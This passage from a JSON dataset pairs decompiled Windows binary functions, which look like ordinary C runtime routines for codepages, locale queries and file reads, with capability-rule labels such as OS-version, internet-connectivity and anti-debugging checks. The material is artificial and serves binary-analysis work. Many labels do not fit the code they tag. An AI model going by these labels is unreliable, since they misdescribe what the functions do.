fcn.0041611c();\ncode_r0x0041649a:\n    fcn.0040d590();\n    return;\ncode_r0x00416341:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x0041634c;\n    goto code_r0x00416339;\ncode_r0x0041634c:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x442ca0 == 0) goto code_r0x0041649a;\n        goto code_r0x00416489;\n    }\n    puVar8 = 0x442e20;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x442f24 = arg_8h;\n    *0x442d84 = 0;\n    if (lpCPInfo < 2) {\n        *0x442e00 = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x442d84 = fcn.004160c4();\n        *0x442e00 = extraout_ECX_00;\n    }\n    *0x442f30 = 0;\n    *0x442f34 = 0;\n    *0x442f38 = 0;\n    goto code_r0x0041648e;\n}\n",
        "token_count": 1251
    },
    "00416852": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00416852(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.0041580c(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.0040e63a(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 838
    },
    "0041693c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041693c(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_2 / 0x20;\n    uVar1 = *(param_1 + iVar2 * 4) & ~(-1 << (0x1fU - param_2 % 0x20 & 0x1f));\n    while( true ) {\n        if (uVar1 != 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        if (2 < iVar2) break;\n        uVar1 = *(param_1 + iVar2 * 4);\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "00416a6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416a6d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch % 0x20;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = *(arg_8h + iVar2 * 4);\n        *(arg_8h + iVar2 * 4) = uVar1 >> (uVar3 & 0x1f) | var_4h;\n        var_4h = (uVar1 & ~(-1 << (uVar3 & 0x1f))) << (0x20 - uVar3 & 0x1f);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 3);\n    iVar2 = 2;\n    puVar4 = arg_8h + (2 - arg_ch / 0x20) * 4;\n    do {\n        if (iVar2 < arg_ch / 0x20) {\n            *(arg_8h + iVar2 * 4) = 0;\n        }\n        else {\n            *(arg_8h + iVar2 * 4) = *puVar4;\n        }\n        iVar2 = iVar2 + -1;\n        puVar4 = puVar4 + -1;\n    } while (-1 < iVar2);\n    return;\n}\n",
        "token_count": 353
    },
    "00417133": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00417133(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x442ca8 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) ||\n           (*0x442ca8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\"),  *0x442ca8 == NULL)) {\n            return 0;\n        }\n        *0x442cac = (*pcVar1)(iVar2, \"GetActiveWindow\");\n        *0x442cb0 = (*pcVar1)(iVar2, \"GetLastActivePopup\");\n        if ((*0x442a60 == 2) && (*0x442cb8 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x442cb8 != NULL)) {\n            *0x442cb4 = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x442cb4 == NULL) ||\n       (((iVar2 = (**0x442cb4)(),  iVar2 != 0 && (iVar2 = (**0x442cb8)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x442cac != NULL) && (iVar4 = (**0x442cac)(),  iVar4 != 0)) && (*0x442cb0 != NULL)) {\n            iVar4 = (**0x442cb0)(iVar4);\n        }\n    }\n    else if (*0x442a6c < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x442ca8)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 548
    },
    "0041722c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041722c(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x442e21) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x4417c0 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 133
    },
    "004178be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004178be(uint32_t arg_8h, char *arg_ch, char *nNumberOfBytesToRead)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_8h = NULL;\n    if (nNumberOfBytesToRead != NULL) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x4430a0;\n        iVar9 = (arg_8h & 0x1f) * 0x24;\n        uVar3 = *(*piVar1 + iVar9 + 4);\n        if ((uVar3 & 2) == 0) {\n            pcVar8 = arg_ch;\n            if (((uVar3 & 0x48) != 0) && (*(*piVar1 + iVar9 + 5) != '\\n')) {\n                nNumberOfBytesToRead = nNumberOfBytesToRead + -1;\n                *arg_ch = *(*piVar1 + 5 + iVar9);\n                pcVar8 = arg_ch + 1;\n                var_8h = 0x1;\n                *(*piVar1 + 5 + iVar9) = 10;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(*piVar1 + iVar9), pcVar8, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n            if (iVar6 == 0) {\n                iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar9 == 5) {\n                    puVar7 = fcn.0041296c();\n                    *puVar7 = 9;\n                    puVar7 = fcn.00412975();\n                    *puVar7 = 5;\n                }\n                else {\n                    if (iVar9 == 0x6d) {\n                        return 0;\n                    }\n                    fcn.0041297e(iVar9);\n                }\n                return -1;\n            }\n            if ((*(*piVar1 + 4 + iVar9) & 0x80) == 0) {\n                return var_8h + lpNumberOfBytesRead;\n            }\n            if ((lpNumberOfBytesRead == 0) || (*arg_ch != '\\n')) {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 & 0xfb;\n            }\n            else {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 | 4;\n            }\n            var_8h = arg_ch + var_8h + lpNumberOfBytesRead;\n            nNumberOfBytesToRead = arg_ch;\n            pcVar8 = arg_ch;\n            if (arg_ch < var_8h) {\n                do {\n                    cVar4 = *nNumberOfBytesToRead;\n                    if (cVar4 == '\\x1a') {\n                        if ((*(*piVar1 + 4 + iVar9) & 0x40) == 0) {\n                            puVar2 = *piVar1 + 4 + iVar9;\n                            *puVar2 = *puVar2 | 2;\n                        }\n                        break;\n                    }\n                    if (cVar4 == '\\r') {\n                        if (nNumberOfBytesToRead < var_8h + -1) {\n                            if (nNumberOfBytesToRead[1] == '\\n') {\n                                pcVar5 = nNumberOfBytesToRead + 2;\n                                goto code_r0x00417a4b;\n                            }\ncode_r0x00417a65:\n                            nNumberOfBytesToRead = nNumberOfBytesToRead + 1;\n                            *pcVar8 = '\\r';\n                        }\n                        else {\n                            pcVar5 = nNumberOfBytesToRead + 1;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (*(*piVar1 + iVar9), &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                            if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0)) ||\n                               (lpNumberOfBytesRead == 0)) goto code_r0x00417a65;\n                            if ((*(*piVar1 + 4 + iVar9) & 0x48) == 0) {\n                                if ((pcVar8 == arg_ch) && (lpBuffer == '\\n')) goto code_r0x00417a4b;\n                                fcn.004129f1(arg_8h, 0xffffffff, 1);\n                                if (lpBuffer == '\\n') goto code_r0x00417a69;\n                                goto code_r0x00417a65;\n                            }\n                            if (lpBuffer == '\\n') {\ncode_r0x00417a4b:\n                                nNumberOfBytesToRead = pcVar5;\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*piVar1 + 5 + iVar9) = lpBuffer;\n                                nNumberOfBytesToRead = pcVar5;\n                            }\n                        }\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead;\n                    }\n                    else {\n                        *pcVar8 = cVar4;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead + 1;\n                    }\ncode_r0x00417a69:\n                    nNumberOfBytesToRead = pcVar5;\n                } while (nNumberOfBytesToRead < var_8h);\n            }\n            return pcVar8 - arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1329
    },
    "00417e16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00417e16(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x441ebc);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x441ef0);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x441ec0);\n            }\n            else {\n                iVar1 = *(in_EAX * 4 + 0x441ef4);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x441ebc);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x441ef0);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x441ea8 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x441ea0 = arg_10h;\n        *0x441ea4 = iVar5;\n    }\n    else {\n        *0x441eb4 = (iVar2 + *0x441e10 + arg_24h) * 1000 + arg_28h;\n        if (*0x441eb4 < 0) {\n            *0x441eb4 = *0x441eb4 + 86400000;\n            *0x441eb0 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x441eb0 = iVar5;\n            if (86399999 < *0x441eb4) {\n                *0x441eb4 = *0x441eb4 + -86400000;\n                *0x441eb0 = iVar5 + 1;\n            }\n        }\n        *0x441eac = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 938
    },
    "0041826e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041826e(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00418220(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            iVar2 = fcn.00416852(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00416852(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            if (iVar2 == 0) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 253
    },
    "0041840b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041840b(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.004191f0(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.00416852(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00416852(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 313
    },
    "0041848a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041848a(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 341
    },
    "004185ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.004185ec(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint arg_8h, \n            uint arg_ch, uint noname_8, uint noname_9, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t unaff_EBP;\n    uint Locale;\n    uint LCType;\n    uint lpLCData;\n    uint cchData;\n    uint var_34h;\n    uint uVar2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x43d150;\n    var_20h = 0x4185f8;\n    fcn.0040f0bc();\n    if (*0x442d78 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x418621;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x442d78 = 2;\n            }\n        }\n        else {\n            *0x442d78 = 1;\n        }\n    }\n    if (*0x442d78 == 1) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n    }\n    else if ((*0x442d78 == 2) || (*0x442d78 == 0)) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x442c00;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h_00 = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h_00 = fcn.0040b8de(*(unaff_EBP + -0x20));\n                if (arg_8h_00 == NULL) goto code_r0x00418713;\n                *(unaff_EBP + -0x24) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h_00, *(unaff_EBP + -0x20));\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    var_28h = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    var_28h = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 0x18), 1, arg_8h_00, 0xffffffff, uVar2, var_28h);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            if (*(unaff_EBP + -0x24) != 0) {\n                fcn.0040cfb5(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00418713:\n    *(unaff_EBP + -0x38) = 0x41871b;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1252
    },
    "0041871c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.0041871c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint Locale, \n            uint LCType, uint lpLCData, uint cchData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_4h;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_34h;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x43d160;\n    var_20h = 0x418728;\n    fcn.0040f0bc();\n    if (*0x442d7c == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x418751;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x442d7c = 2;\n            }\n        }\n        else {\n            *0x442d7c = 1;\n        }\n    }\n    if ((*0x442d7c == 2) || (*0x442d7c == 0)) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n    }\n    else if (*0x442d7c == 1) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x442c00;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h = fcn.0040b8de(iVar1 * 2);\n                if (arg_8h == NULL) goto code_r0x00418853;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h, iVar1);\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    uVar3 = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x18), 0, arg_8h, 0xffffffff, uVar2, uVar3, 0, 0);\n                *(unaff_EBP + -0x1c) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.0040cfb5(arg_8h);\n            }\n        }\n    }\ncode_r0x00418853:\n    *(unaff_EBP + -0x38) = 0x41885b;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1212
    },
    "00418a14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
